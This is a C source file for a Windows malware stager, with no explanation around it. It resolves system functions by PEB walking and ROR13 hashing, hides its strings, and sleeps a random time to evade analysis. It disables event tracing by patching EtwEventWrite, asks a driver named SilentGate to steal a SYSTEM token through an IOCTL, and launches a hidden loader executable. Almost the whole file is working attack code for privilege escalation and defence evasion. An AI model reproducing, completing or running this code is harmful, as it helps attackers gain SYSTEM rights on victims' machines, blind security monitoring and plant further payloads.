#include <winsock2.h>
#include <windows.h>

typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef HANDLE  (WINAPI *pCreateFileA)(LPCSTR,DWORD,DWORD,LPVOID,DWORD,DWORD,HANDLE);
typedef BOOL    (WINAPI *pDeviceIoControl)(HANDLE,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
typedef BOOL    (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL    (WINAPI *pCreateProcessA)(LPCSTR,LPSTR,LPVOID,LPVOID,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef DWORD   (WINAPI *pWaitForSingleObject)(HANDLE,DWORD);
typedef VOID    (WINAPI *pSleep)(DWORD);
typedef DWORD   (WINAPI *pGetTickCount)(void);
typedef BOOL    (WINAPI *pVirtualProtect)(LPVOID,SIZE_T,DWORD,PDWORD);

#define IOCTL_SG_STEAL_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN,0x904,METHOD_BUFFERED,FILE_ANY_ACCESS)

static DWORD ror13(const char* name) {
    DWORD h=0;
    for(const char* p=name;*p;p++){
        h=((h>>13)|(h<<19))&0xFFFFFFFF;
        h=(h+(BYTE)*p)&0xFFFFFFFF;
    }
    return h;
}

static PVOID find_export(BYTE* base, DWORD hash) {
    DWORD pe=*(DWORD*)(base+0x3C);
    DWORD exp=*(DWORD*)(base+pe+0x88);
    BYTE* ed=base+exp;
    DWORD num=*(DWORD*)(ed+0x18);
    DWORD* names=(DWORD*)(base+*(DWORD*)(ed+0x20));
    WORD* ords=(WORD*)(base+*(DWORD*)(ed+0x24));
    DWORD* funcs=(DWORD*)(base+*(DWORD*)(ed+0x1C));
    for(DWORD i=0;i<num;i++)
        if(ror13((char*)(base+names[i]))==hash)
            return base+funcs[ords[i]];
    return NULL;
}

static DWORD WINAPI steal_and_launch(LPVOID param) {
    Sleep(3000+(GetTickCount()%2000));

    BYTE* peb=(BYTE*)__readgsqword(0x60);
    BYTE* ldr=*(BYTE**)(peb+0x18);
    BYTE* list=*(BYTE**)(ldr+0x20);
    BYTE* e1=*(BYTE**)list;
    BYTE* e2=*(BYTE**)e1;
    BYTE* k32=*(BYTE**)(e2+0x20);
    BYTE* e3=*(BYTE**)e2;
    BYTE* ntdll=*(BYTE**)(e3+0x20);

    pGetProcAddress _GPA=(pGetProcAddress)find_export(k32,0x7C0DFCAA);
    pSleep _Sl=(pSleep)find_export(k32,0xDB2D49B0u);
    pGetTickCount _GTC=(pGetTickCount)find_export(k32,0xF791FB23u);
    pVirtualProtect _VP=(pVirtualProtect)find_export(k32,0x7946C61Bu);
    pCreateFileA _CFA=(pCreateFileA)find_export(k32,0x7C0017A5u);
    pDeviceIoControl _DIO=(pDeviceIoControl)find_export(k32,0xA8E14A7Du);
    pCloseHandle _CH=(pCloseHandle)find_export(k32,0x0FFD97FBu);
    pCreateProcessA _CPA=(pCreateProcessA)find_export(k32,0x16B3FE72u);
    pWaitForSingleObject _WFSO=(pWaitForSingleObject)find_export(k32,0xCE05D9ADu);

    /* ETW patch */
    char etw[]={'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
    FARPROC ep=_GPA((HMODULE)ntdll,etw);
    DWORD old=0;
    _VP(ep,1,PAGE_EXECUTE_READWRITE,&old);
    *(BYTE*)ep=0xC3;
    _VP(ep,1,old,&old);

    /* Open SilentGate device */
    char dev[]={'\\','\\','.','\\','S','i','l','e','n','t','G','a','t','e',0};
    HANDLE hDev=_CFA(dev,GENERIC_READ|GENERIC_WRITE,0,NULL,
        OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

    if(hDev==INVALID_HANDLE_VALUE) goto launch;

    /* Steal SYSTEM token */
    DWORD nb=0;
    BOOL ok=_DIO(hDev,IOCTL_SG_STEAL_TOKEN,NULL,0,NULL,0,&nb,NULL);
    _CH(hDev);
    if(!ok) goto launch;

launch:
    {
        /* Launch sg_loader.exe */
        char loader[]={'C',':','\\','P','r','o','g','r','a','m','D','a','t','a',
                       '\\','l','p','e','\\','s','g','_','l','o','a','d','e','r',
                       '.','e','x','e',0};
        STARTUPINFOA si={sizeof(si)};
        PROCESS_INFORMATION pi={0};
        si.dwFlags=STARTF_USESHOWWINDOW;
        si.wShowWindow=SW_HIDE;
        _CPA(loader,NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
        if(pi.hProcess){
            _WFSO(pi.hProcess,15000);
            _CH(pi.hProcess);
            _CH(pi.hThread);
        }
    }
    return 0;
}

int main(){
    HANDLE t=CreateThread(NULL,0,steal_and_launch,NULL,0,NULL);
    if(t){WaitForSingleObject(t,30000);CloseHandle(t);}
    return 0;
}
